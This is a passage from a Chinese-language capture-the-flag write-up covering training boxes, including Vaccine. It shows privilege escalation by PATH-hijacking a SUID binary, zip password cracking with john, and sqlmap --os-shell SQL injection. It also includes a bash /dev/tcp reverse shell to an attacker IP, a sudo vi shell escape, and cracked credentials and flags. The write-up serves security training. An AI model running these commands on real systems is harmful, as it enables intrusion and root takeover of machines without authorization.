/usr/bin/bugtracker<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/86e6e3cfb4b1f066.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Regardless of which <span class="hljs-keyword">user</span> <span class="hljs-title">starts</span> running the bugtracker executable, what&#x27;s <span class="hljs-keyword">user</span> <span class="hljs-title">privileges</span> will use to run?<br>:root<br></code></pre></td></tr></table></figure><h3 id="Task-9-4"><a href="#Task-9-4" class="headerlink" title="Task 9"></a>Task 9</h3><p><strong>SUID</strong> (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux&#x2F;Unix 中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID 被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件<strong>。简而言之用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的 UID 和 GID</strong>。</p><p>简而言之就是，在使用命令时给普通用户赋予所有者的权限，比如 root 权限</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">What SUID stands for?<br>:Set owner <span class="hljs-keyword">User</span> <span class="hljs-title">ID</span><br></code></pre></td></tr></table></figure><h3 id="Task-10-2"><a href="#Task-10-2" class="headerlink" title="Task 10"></a>Task 10</h3><p><img src="https://img.dkdun.cn/v1/2025/12/07eaaaf18ba81810.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> executable being called <span class="hljs-keyword">in</span> <span class="hljs-keyword">an</span> insecure manner?<br>:cat<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-7"><a href="#Submit-Flag-7" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>蚁剑连接时查看 userflag</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:f2c74ee8db7983851ab2a96a44eb7981<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-8"><a href="#Submit-Flag-8" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>从前面已经发现 <code>bugtracker</code> 有 root 权限，并且我们能够调用 cat 命令，cat 命令是使用<strong>绝对路径</strong>来调用的，即在当前用户的环境变量指定的路径中查找 cat 命令，所以可以创建一个恶意的 cat 命令，并修改当前用户环境变量，将权限提升为 root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span>//将/tmp目录设置为环境变量<br><span class="hljs-built_in">cd</span> /tmp///切换到/tmp目录下<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> &gt; <span class="hljs-built_in">cat</span>//构造恶意的<span class="hljs-built_in">cat</span>命令<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>//赋予权限<br></code></pre></td></tr></table></figure><p><code>bugtracker</code> 调用 cat 命令时实际上调用的是 &#96;&#96;&#x2F;tmp&#96; 目录下的恶意的 cat 命令，此时 robert 用户临时具有了root 权限，uid 变成了root，但不是 root 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/ff0ea81990e4297c.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:af13b0bee69f8a877c3faf667f7beacf<br></code></pre></td></tr></table></figure><h2 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h2><h3 id="Task-1-7"><a href="#Task-1-7" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs less">└─# <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sS</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-Pn</span> <span class="hljs-number">10.129</span><span class="hljs-selector-class">.69</span><span class="hljs-selector-class">.163</span><br><span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-number">7.94S</span><span class="hljs-selector-tag">VN</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-03-05 00:23 CST</span><br>Nmap scan report for <span class="hljs-number">10.129</span>.<span class="hljs-number">69.163</span><br>Host is up (<span class="hljs-number">1.9s</span> latency).<br><span class="hljs-keyword">Not</span> <span class="hljs-attribute">shown</span>: <span class="hljs-number">997</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">21</span>/tcp open  ftp<br>| <span class="hljs-attribute">ftp-syst</span>:<br>|   <span class="hljs-attribute">STAT</span>:<br>| FTP server <span class="hljs-attribute">status</span>:<br>|      Connected <span class="hljs-attribute">to </span>::<span class="hljs-attribute">ffff</span>:<span class="hljs-number">10.10</span>.<span class="hljs-number">16.36</span><br>|      Logged in as ftpuser<br>|      <span class="hljs-attribute">TYPE</span>: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is <span class="hljs-number">300</span><br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was <span class="hljs-number">1</span><br>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable<br>|_End of status<br>| <span class="hljs-attribute">ftp-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)<br>|_-rwxr-xr-x    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">2533</span> Apr <span class="hljs-number">13</span>  <span class="hljs-number">2021</span> backup.zip<br><span class="hljs-number">22</span>/tcp open  ssh<br>| <span class="hljs-attribute">ssh-hostkey</span>:<br>|   <span class="hljs-number">3072</span> <span class="hljs-attribute">c0</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">58</span>:<span class="hljs-number">07</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:<span class="hljs-attribute">b0</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">91</span>:<span class="hljs-number">65</span>:<span class="hljs-attribute">b2</span>:<span class="hljs-number">59</span>:<span class="hljs-number">56</span>:<span class="hljs-number">95</span>:<span class="hljs-number">27</span>:a4 (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-attribute">ac</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">81</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:<span class="hljs-number">22</span>:<span class="hljs-attribute">d7</span>:<span class="hljs-attribute">a7</span>:<span class="hljs-number">41</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">81</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">b8</span>:<span class="hljs-attribute">b2</span>:<span class="hljs-number">51</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">42</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c3</span>:<span class="hljs-number">21</span>:<span class="hljs-attribute">df</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-attribute">a2</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c9</span>:<span class="hljs-number">5</span><span class="hljs-attribute">e</span>:<span class="hljs-number">03</span>:<span class="hljs-number">42</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">69</span>:<span class="hljs-attribute">d0</span>:<span class="hljs-number">28</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http<br>| <span class="hljs-attribute">http-cookie-flags</span>:<br>|   /:<br>|     <span class="hljs-attribute">PHPSESSID</span>:<br>|_      httponly flag <span class="hljs-keyword">not</span> set<br>|<span class="hljs-attribute">_http-title</span>: MegaCorp Login<br><br>Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">97.70</span> seconds<br></code></pre></td></tr></table></figure><p>21 FTP、22 SSH、80 HTTP</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Besides SSH <span class="hljs-keyword">and</span> HTTP, what other service <span class="hljs-keyword">is</span> hosted <span class="hljs-keyword">on</span> <span class="hljs-keyword">this</span> box?<br>:FTP<br></code></pre></td></tr></table></figure><h3 id="Task-2-7"><a href="#Task-2-7" class="headerlink" title="Task 2"></a>Task 2</h3><p>FTP 的匿名登录</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">anonymous:</span>anonymous<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">This service can be configured <span class="hljs-keyword">to</span> allow <span class="hljs-keyword">login</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> specific username. What <span class="hljs-keyword">is</span> that username?<br>:anonymous<br></code></pre></td></tr></table></figure><h3 id="Task-3-7"><a href="#Task-3-7" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">ftp&gt; ls<br>229 Entering Extended Passive Mode (|||10202|)<br>150 Here comes the directory listing.<br>-rwxr-xr-x   <span class="hljs-number"> 1 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 2533 </span>Apr<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>backup.zip<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> downloaded <span class="hljs-keyword">over</span> this service?<br>:backup.zip<br></code></pre></td></tr></table></figure><h3 id="Task-4-7"><a href="#Task-4-7" class="headerlink" title="Task 4"></a>Task 4</h3><p>使用 john  爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">zip2john backup.zip &gt; crack<br><br>john -wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt crack<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8464f657edc85e83.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What script comes <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> John The Ripper toolset <span class="hljs-keyword">and</span> generates <span class="hljs-keyword">a</span> hash <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> password protected zip archive <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">format</span> <span class="hljs-built_in">to</span> allow <span class="hljs-keyword">for</span> cracking attempts?<br>:zip2john<br></code></pre></td></tr></table></figure><h3 id="Task-5-7"><a href="#Task-5-7" class="headerlink" title="Task 5"></a>Task 5</h3><p>解压 zip 文件</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">unzip backup.zip<br>密码:<span class="hljs-number">741852963</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/981dbec569bd6475.png"></p><p>拿到用户名和密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>qwerty789<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5837ad06765b5e8c.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">admin</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">on</span> the website?<br>:qwerty789<br></code></pre></td></tr></table></figure><h3 id="Task-6-7"><a href="#Task-6-7" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">What option can <span class="hljs-keyword">be</span> passed <span class="hljs-keyword">to</span> sqlmap <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span> execution via the sql injection?<br>:--os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h3 id="Task-7-7"><a href="#Task-7-7" class="headerlink" title="Task 7"></a>Task 7</h3><p>进入网站发现存在 sql 注入点，sqlmap 跑一下，跑的超级慢</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u http://<span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">34</span>.<span class="hljs-number">175</span>/dashboard.php?search=Pico --cookie=&quot;PHPSESSID=<span class="hljs-number">9</span>ak49pbfau0kfkh436vo92tft0&quot; --os-shell --batch<br></code></pre></td></tr></table></figure><p>反弹一个 shell 去监听</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &amp;&gt; /dev/tcp/10.10.16.36/1234 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p>然后在 <code>/var/www/html</code> 目录下的 <code>dashboard.php</code> 中找到密码 <code>P@s5w0rd!</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">postgres:<span class="hljs-symbol">P@</span>s5w0rd!<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ebc018fcbb5f0b51.png"></p><p>可以看见 <code>(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code>，说明可以以 root 运行 <code>vi</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">What program can the postgres <span class="hljs-keyword">user</span> <span class="hljs-title">run</span> as root using sudo?<br>:vi<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-9"><a href="#Submit-Flag-9" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><img src="https://img.dkdun.cn/v1/2025/12/bf7f08bde67594a7.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:ec9b13ca4d6229cd5cc1e09980965bf7<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-10"><a href="#Submit-Flag-10" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>执行以 root 权限打开 vi</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf<br></code></pre></td></tr></table></figure><p>之后输入</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">:!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>因为在 vi 的命令模式下，输入 <code>!</code> 代表强制执行，比如输入的 <code>!/bin/sh</code>，就代表以 shell 执行 <code>/bin/sh</code> </p><p>然后就成功提升到 root 权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/cab4adb88af9b153.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:dd6e058e814260bc70e9bbdef2715849<br></code></pre></td></tr></table></figure><h2 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h2><h3 id="Task-1-8"><a href="#Task-1-8" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs wren"> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">sS</span> <span class="hljs-operator">-</span><span class="hljs-variable">sV</span> <span class="hljs-number">10.129</span><span class="hljs-number">.119</span><span class="hljs-number">.72</span><br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span>SVN ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-03-05 19:38 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.119</span><span class="hljs-number">.72</span><br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.43</span>s <span class="hljs-variable">latency</span>).<br><span class="hljs-title class_">Not</span> <span class="hljs-variable">shown</span>: <span class="hljs-number">996</span> <span class="hljs-variable">closed</span> <span class="hljs-variable">tcp</span> <span class="hljs-title function_">ports</span> (<span class="hljs-variable">reset</span>)<br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>         <span class="hljs-variable">VERSION</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>             <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.2</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">6789</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ibm</span><span class="hljs-operator">-</span><span class="hljs-variable">db2</span><span class="hljs-operator">-</span><span class="hljs-variable">admin?</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-number">8443</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ssl</span>/<span class="hljs-variable">nagios</span><span class="hljs-operator">-</span><span class="hljs-variable">nsca</span> <span class="hljs-title class_">Nagios</span> <span class="hljs-variable">NSCA</span><br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>8080<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.94</span>SVN<span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>/<span class="hljs-number">5</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">67</span>C837E3<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">GetRequest</span>,<span class="hljs-number">84</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>302<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Location:<span class="hljs-char escape_">\x20</span>http://localhost:80</span><br><span class="hljs-string">SF:80/manage<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>11:39:15<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">84</span>,<br><span class="hljs-variable">SF</span>:<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>302<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Location:<span class="hljs-char escape_">\x20</span>http://localhost:8080/manage<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>C</span><br><span class="hljs-string">SF:ontent-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025<span class="hljs-char escape_">\x20</span>11:39:16\x</span><br><span class="hljs-string">SF:20GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">24</span>E,<span class="hljs-string">&quot;HTTP/1\.1\x2</span><br><span class="hljs-string">SF:0400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Languag</span><br><span class="hljs-string">SF:e:<span class="hljs-char escape_">\x20</span>en<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>435<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>202</span><br><span class="hljs-string">SF:5<span class="hljs-char escape_">\x20</span>11:39:19<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>html&gt;&lt;</span><br><span class="hljs-string">SF:html<span class="hljs-char escape_">\x20</span>lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span>\</span><br><span class="hljs-string">SF:x20Bad<span class="hljs-char escape_">\x20</span>Request&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-fami</span><br><span class="hljs-string">SF:ly:Tahoma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:white;</span><br><span class="hljs-string">SF:background-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-si</span><br><span class="hljs-string">SF:ze:16px;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a<span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&#123;color:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;border</span><br><span class="hljs-string">SF::none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span>\x</span><br><span 